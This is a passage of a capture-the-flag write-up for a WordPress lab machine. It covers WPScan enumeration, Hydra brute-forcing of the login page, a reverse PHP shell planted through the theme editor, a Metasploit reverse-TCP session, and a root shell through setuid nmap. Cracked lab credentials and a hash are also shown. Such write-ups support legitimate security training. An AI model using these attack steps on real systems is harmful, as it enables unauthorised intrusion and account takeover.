class="c2"><span class="c1">&nbsp;| Location: http://10.10.187.95/wp-content/themes/twentyfifteen/</span></p><p class="c2"><span class="c1">&nbsp;| Last Updated: 2022-05-24T00:00:00.000Z</span></p><p class="c2"><span class="c1">&nbsp;| Readme: http://10.10.187.95/wp-content/themes/twentyfifteen/readme.txt</span></p><p class="c2"><span class="c1">&nbsp;| [!] The version is out of date, the latest version is 3.2</span></p><p class="c2"><span class="c1">&nbsp;| Style URL: http://10.10.187.95/wp-content/themes/twentyfifteen/style.css?ver=4.3.1</span></p><p class="c2"><span class="c1">&nbsp;| Style Name: Twenty Fifteen</span></p><p class="c2"><span class="c1">&nbsp;| Style URI: https://wordpress.org/themes/twentyfifteen/</span></p><p class="c2"><span class="c1">&nbsp;| Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteens simple, st...</span></p><p class="c2"><span class="c1">&nbsp;| Author: the WordPress team</span></p><p class="c2"><span class="c1">&nbsp;| Author URI: https://wordpress.org/</span></p><p class="c2"><span class="c1">&nbsp;|</span></p><p class="c2"><span class="c1">&nbsp;| Found By: Css Style In 404 Page (Passive Detection)</span></p><p class="c2"><span class="c1">&nbsp;|</span></p><p class="c2"><span class="c1">&nbsp;| Version: 1.3 (80% confidence)</span></p><p class="c2"><span class="c1">&nbsp;| Found By: Style (Passive Detection)</span></p><p class="c2"><span class="c1">&nbsp;| &nbsp;- http://10.10.187.95/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: &#39;Version: 1.3&#39;</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[i] No plugins Found.</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span></p><p class="c2"><span class="c1">&nbsp;Checking Known Locations - Time: 00:02:08 &lt;==============================================================================================&gt; (472 / 472) 100.00% Time: 00:02:08</span></p><p class="c2"><span class="c1">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[i] No themes Found.</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span></p><p class="c2"><span class="c1">&nbsp;Checking Known Locations - Time: 00:10:42 &lt;============================================================================================&gt; (2575 / 2575) 100.00% Time: 00:10:42</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[i] No Timthumbs Found.</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></p><p class="c2"><span class="c1">&nbsp;Checking Config Backups - Time: 00:00:34 &lt;===============================================================================================&gt; (137 / 137) 100.00% Time: 00:00:34</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[i] No Config Backups Found.</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span></p><p class="c2"><span class="c1">&nbsp;Checking DB Exports - Time: 00:00:17 &lt;=====================================================================================================&gt; (71 / 71) 100.00% Time: 00:00:17</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[i] No DB Exports Found.</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span></p><p class="c2"><span class="c1">&nbsp;Brute Forcing Attachment IDs - Time: 00:00:05 &lt;==========================================================================================&gt; (100 / 100) 100.00% Time: 00:00:05</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[i] Medias(s) Identified:</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] http://10.10.187.95/?attachment_id=2</span></p><p class="c2"><span class="c1">&nbsp;| Found By: Attachment Brute Forcing (Aggressive Detection)</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] Enumerating Users (via Passive and Aggressive Methods)</span></p><p class="c2"><span class="c1">&nbsp;Brute Forcing Author IDs - Time: 00:00:00 &lt;================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[i] No Users Found.</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span></p><p class="c2"><span class="c1">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] Finished: Fri Jul &nbsp;8 23:02:35 2022</span></p><p class="c2"><span class="c1">[+] Requests Done: 3419</span></p><p class="c2"><span class="c1">[+] Cached Requests: 10</span></p><p class="c2"><span class="c1">[+] Data Sent: 931.095 KB</span></p><p class="c2"><span class="c1">[+] Data Received: 1.325 MB</span></p><p class="c2"><span class="c1">[+] Memory used: 279.711 MB</span></p><p class="c2"><span class="c1">[+] Elapsed time: 00:14:02</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><h2 class="c0" id="h.hqamj5mujhg9"><span class="c12 c13">EXPLOITATION</span></h2><p class="c2"><span class="c1">Nothing great from wpscan so lets give a try to our dictionary file.</span></p><p class="c2"><span class="c1">We clean duplicates from our fsocity.dic</span></p><p class="c2"><span class="c1">sort -u fsocity.dic &gt; clean.dic</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><p class="c2"><span class="c1">Now we use our clean.dic to perform a dictionary based attack with Burpsuite in our WP Login page &quot;/wp-login&quot;</span></p><p class="c2"><span class="c1">First, lets clean a little more our wordlist to get some valid usernames:</span></p><p class="c2"><span class="c1">cat wordlistsorted.dic | grep -v -e &#39;^[0-9]&#39; -e &#39;ABC&#39; &gt; usernames.dic</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><p class="c2"><span class="c1">We will use hydra:</span></p><p class="c2"><span class="c1">First lets get us a valid username:</span></p><p class="c2"><span class="c1">hydra -L /root/Downloads/usernames.dic -p &#39;123&#39; 10.10.96.6 -V http-form-post &#39;/wp-login:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:F=Invalid&#39; -t 30</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><p class="c2"><span class="c1">After a little time we got a HIT. Great!!!</span></p><p class="c2"><span class="c1">Now let&#39;s go for the password:</span></p><p class="c2"><span class="c1">hydra -l &#39;Elliot&#39; -P /root/Downloads/usernames.dic 10.10.96.6 -V http-form-post &#39;/wp-login:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:F=The password you entered for the username&#39; -t 30</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><p class="c2"><span class="c1">Finally we have access.</span></p><p class="c2"><span class="c1">[ATTEMPT] target 10.10.27.211 - login &quot;Elliot&quot; - pass &quot;Episodic&quot; - 840 of 8198 [child 41] (0/0)</span></p><p class="c2"><span class="c1">[ATTEMPT] target 10.10.27.211 - login &quot;Elliot&quot; - pass &quot;Eps&quot; - 841 of 8198 [child 22] (0/0)</span></p><p class="c2"><span class="c1">[ATTEMPT] target 10.10.27.211 - login &quot;Elliot&quot; - pass &quot;Eps1&quot; - 842 of 8198 [child 37] (0/0)</span></p><p class="c2"><span class="c1">[ATTEMPT] target 10.10.27.211 - login &quot;Elliot&quot; - pass &quot;Eric&quot; - 843 of 8198 [child 40] (0/0)</span></p><p class="c2"><span class="c1">[80][http-post-form] host: 10.10.27.211 &nbsp; login: Elliot &nbsp; password: ????????</span></p><p class="c2"><span class="c1">1 of 1 target successfully completed, 1 valid password found</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><p class="c2"><span class="c1">Elliot : ER28-0652</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><p class="c2"><span class="c1">Inside of WordPress go to:</span></p><ul class="c9 lst-kix_vkif30pfzy5o-0 start"><li class="c6 li-bullet-0"><span class="c1">Appareance</span></li><li class="c6 li-bullet-0"><span class="c1">Editor</span></li><li class="c6 li-bullet-0"><span class="c1">Select one of the PHP files on the right to overwrite it with a reverse shell. I used archive.php</span></li></ul><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 173.33px; height: 206.67px;"><img alt="" src="images/image3.png" style="width: 173.33px; height: 206.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c9 lst-kix_36le3ofcbthj-0 start"><li class="c6 li-bullet-0"><span class="c1">Put a reverse PHP shell inside and update the file</span></li></ul><p class="c2"><span class="c1">Now lets just set up our listener</span></p><p class="c2"><span class="c1">nc -nlvp 4444</span></p><p class="c2"><span class="c1">Listening on 0.0.0.0 4444</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><p class="c2"><span class="c1">And visit our php file modified to activate our reverse shell</span></p><p class="c2"><span class="c1">http://10.10.187.95/wp-content/themes/twentyfifteen/archive.php</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><p class="c2"><span class="c1">Lets check our connection:</span></p><p class="c2"><span class="c1">Connection received on 10.10.187.95 55318</span></p><p class="c2"><span class="c1">SOCKET: Shell has connected! PID: 2149</span></p><p class="c2"><span class="c1">id</span></p><p class="c2"><span class="c1">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span></p><p class="c2"><span class="c1">ls /home</span></p><p class="c2"><span class="c1">robot</span></p><p class="c2"><span class="c1">cd /home/robot</span></p><p class="c2"><span class="c1">ls</span></p><p class="c2"><span class="c1">key-2-of-3.txt</span></p><p class="c2"><span class="c1">password.raw-md5</span></p><p class="c2"><span class="c1">cat key-2-of-3.txt</span></p><p class="c2"><span class="c1">cat: key-2-of-3.txt: Permission denied</span></p><p class="c2"><span class="c1">cat password.raw-md5</span></p><p class="c2"><span class="c1">robot:c3fcd3d76192e4007dfb496cca67e13b</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><p class="c2"><span class="c1">From Crackstation we get this:</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 44.00px;"><img alt="" src="images/image4.png" style="width: 624.00px; height: 44.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">username: robot, password: abcdefghijklmnopqrstuvwxyz</span></p><p class="c2"><span class="c17">using those credentials we utilize the exploit </span><span class="c12">exploit/linux/local/su_login</span><span class="c1">&nbsp;from Metasploit and we logs in as user</span></p><p class="c2"><span class="c1">[*] Started reverse TCP handler on 10.18.44.7:4445</span></p><p class="c2"><span class="c1">[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)</span></p><p class="c2"><span class="c1">[+] The target appears to be vulnerable.</span></p><p class="c2"><span class="c1">[*] Uploading payload to target</span></p><p class="c2"><span class="c1">[*] Attempting to login with su</span></p><p class="c2"><span class="c1">[*] Sending stage (989032 bytes) to 10.10.199.17</span></p><p class="c2"><span class="c1">[*] Meterpreter session 3 opened (10.18.44.7:4445 -&gt; 10.10.199.17:60427) at 2022-07-10 14:33:15 +0200</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">meterpreter &gt; shell</span></p><p class="c2"><span class="c1">Process 2113 created.</span></p><p class="c2"><span class="c1">Channel 1 created.</span></p><p class="c2"><span class="c1">id</span></p><p class="c2"><span class="c1">uid=1002(robot) gid=1002(robot) groups=1002(robot)</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><p class="c2"><span class="c1">At this point we have the 2nd key.</span></p><p class="c2"><span class="c1">python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;);&#39;</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><h2 class="c10" id="h.a14omevnwrjw"><span class="c13 c12">POST EXPLOITATION</span></h2><p class="c2"><span class="c1">We get this from Linux_Smart_Enum:</span></p><p class="c2"><span class="c1">============================================================( file system )=====</span></p><p class="c2"><span class="c1">[*] fst000 Writable files outside user&#39;s home..............................</span></p><p class="c2"><span class="c1">&nbsp;yes!</span></p><p class="c2"><span class="c1">[*] fst010 Binaries with setuid bit........................................ yes!</span></p><p class="c2"><span class="c1">[!] fst020 Uncommon setuid binaries........................................ yes!</span></p><p class="c2"><span class="c1">---</span></p><p class="c2"><span class="c1">/usr/local/bin/nmap</span></p><p class="c2"><span class="c1">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span></p><p class="c2"><span class="c1">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span></p><p class="c2"><span class="c1">[*] sys050 Can root user log in via SSH?................................... yes!</span></p><p class="c2"><span class="c1">[*] ret020 Cron jobs....................................................... yes!</span></p><p class="c2"><span class="c1">[!] cve-2021-3156 Sudo Baron Samedit vulnerability......................... yes!</span></p><p class="c2"><span class="c1">---</span></p><p class="c2"><span class="c1">Vulnerable! sudo version: 1.8.9p5</span></p><p class="c2"><span class="c1">---</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><p class="c2"><span class="c1">looking at Nmap in GTFOBins we get this</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 82.67px;"><img alt="" src="images/image6.png" style="width: 624.00px; height: 82.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><h2 class="c10" id="h.xsuyq9ov54vb"><span class="c13 c12">ROOT</span></h2><p class="c2"><span class="c1">robot@linux:/tmp$ /usr/local/bin/nmap --interactive</span></p><p class="c2"><span class="c1">/usr/local/bin/nmap --interactive</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span></p><p class="c2"><span class="c1">Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span></p><p class="c2"><span class="c1">nmap&gt; !sh</span></p><p class="c2"><span class="c1">!sh</span></p><p class="c2"><span class="c1"># whoami</span></p><p class="c2"><span class="c1">whoami</span></p><p class="c2"><span class="c1">root</span></p><p class="c2"><span class="c1">#</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><h3 class="c14" id="h.u3gawiivjk5v"><span class="c12 c16">Boom, we finished this machine in a very short time. Congrats and thanks for read!!!</span><span class="c5">&nbsp;</span></h3><p class="c2 c3"><span class="c1"></span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">&nbsp;&#8203;</span></p></body></html>